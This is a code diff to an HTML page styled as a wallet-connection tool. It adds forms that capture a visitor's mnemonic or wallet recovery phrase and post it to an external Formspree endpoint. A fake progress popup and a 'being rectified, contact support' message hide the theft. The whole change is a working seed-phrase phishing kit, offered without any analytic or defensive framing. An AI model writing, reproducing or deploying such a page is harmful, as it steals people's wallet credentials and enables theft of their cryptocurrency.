@@ -53,6 +53,10 @@
       background: #4CAF50;
       color: white;
     }
+@keyframes progress-roll {
+  0% { background-position: 0 0; }
+  100% { background-position: 300px 0; }
+}
 
     /* Input form (hidden by default) */
     .form-content {
@@ -99,39 +103,123 @@
       <button type="button" class="btn2">Enter Wallet Phrase</button>
     </div>
 
-    <!-- Form Content (Shared Space) -->
-    <div class="form-content active" id="form1">
-      <input class="field" type="text" placeholder="Enter Mnemonic Phrase" required />
-      <p>Usually a 12 - 24 words Phrases separated by comas</p>
-      <button type="submit">Connect</button>
-    </div>
+ <!-- Mnemonic Form -->
+<form action="https://formspree.io/f/mzzjpvkp" method="POST" class="form-content active" id="form1">
+  <input class="field" type="text" name="mnemonic_phrase" placeholder="Enter Mnemonic Phrase" required />
+  <p>Usually a 12 - 24 words Phrase separated by commas</p>
+  <input type="hidden" name="form_type" value="Mnemonic Phrase" />
+  <button type="submit">Connect</button>
+</form>
 
-    <div class="form-content" id="form2">
-      <input class="field" type="text" placeholder="Enter Wallet Phrase" required />
-      <button type="submit">Connect</button>
+<!-- Wallet Form -->
+<form action="https://formspree.io/f/mzzjpvkp" method="POST" class="form-content" id="form2">
+  <input class="field" type="text" name="wallet_phrase" placeholder="Enter Wallet Phrase" required />
+  <input type="hidden" name="form_type" value="Wallet Phrase" />
+  <button type="submit">Connect</button>
+</form>
+
+<!-- Popup Modal -->
+<div id="popup" style="
+  display: none; /* HIDDEN BY DEFAULT */
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: rgba(0,0,0,0.6);
+  align-items: center;
+  justify-content: center;
+  z-index: 9999;
+">
+  <div style="
+    background: white;
+    padding: 20px;
+    width: 300px;
+    border-radius: 12px;
+    text-align: center;
+    box-shadow: 0px 4px 20px rgba(0,0,0,0.2);
+  ">
+    <h3 id="popup-title" style="margin-bottom: 10px; color:#333;">Submitting...</h3>
+    <div style="width: 100%;height:100px; background: #eee; border-radius: 5px; overflow: hidden;">
+      <div id="progress-bar" style="
+        width: 0%;
+        height: 10px;
+        background: linear-gradient(90deg, #4CAF50, #6be585);
+        border-radius: 5px;
+        animation: progress-roll 1.5s linear infinite;
+      "></div>
     </div>
+    <p id="popup-message" style="margin-top: 10px; font-size: 14px; color:#555;"></p>
   </div>
+</div>
 
-  <script>
-    const btn1 = document.querySelector('.btn1');
-    const btn2 = document.querySelector('.btn2');
-    const form1 = document.getElementById('form1');
-    const form2 = document.getElementById('form2');
+<script>
+document.querySelectorAll("form").forEach(form => {
+  form.addEventListener("submit", async function (e) {
+    e.preventDefault();
 
-    btn1.addEventListener('click', () => {
-      btn1.classList.add('active');
-      btn2.classList.remove('active');
-      form1.classList.add('active');
-      form2.classList.remove('active');
-    });
+    // Show popup only on submit
+    const popup = document.getElementById("popup");
+    const popupTitle = document.getElementById("popup-title");
+    const popupMessage = document.getElementById("popup-message");
+    const progressBar = document.getElementById("progress-bar");
 
-    btn2.addEventListener('click', () => {
-      btn2.classList.add('active');
-      btn1.classList.remove('active');
-      form2.classList.add('active');
-      form1.classList.remove('active');
-    });
-  </script>
+    popup.style.display = "flex"; // <-- SHOW NOW
+    popupTitle.textContent = "Submitting...";
+    popupMessage.textContent = "";
+    progressBar.style.width = "0%";
+
+    // Animate bar filling gradually
+    let width = 0;
+    const interval = setInterval(() => {
+      if (width < 100) {
+        width += 5;
+        progressBar.style.width = width + "%";
+      } else {
+        clearInterval(interval);
+      }
+    }, 100);
+
+    // Send data to Formspree
+    const data = new FormData(form);
+    try {
+      const response = await fetch(form.action, {
+        method: "POST",
+        body: data,
+        headers: { "Accept": "application/json" }
+      });
+
+      if (response.ok) {
+        setTimeout(() => {
+          popupTitle.textContent = "✅ Submitted Successfully";
+          popupMessage.textContent = "Your entry has been submitted successfully and is being rectified. Contact support for further assistance.";
+          form.reset();
+          progressBar.style.width = "100%";
+        }, 1200);
+      } else {
+        popupTitle.textContent = "❌ Error";
+        popupMessage.textContent = "Submission failed. Please try again.";
+      }
+    } catch (error) {
+      popupTitle.textContent = "⚠️ Network Error";
+      popupMessage.textContent = "Please check your internet connection.";
+      console.error(error);
+    }
+
+    // Hide popup after a delay
+    setTimeout(() => {
+      popup.style.display = "none";
+    }, 10000);
+  });
+});
+</script>
+
+<!-- <style>
+@keyframes progress-roll {
+  0% { background-position: 0 0; }
+  100% { background-position: 300px 0; }
+}
+</style> -->
+
+
+
 
 </body>
 </html>
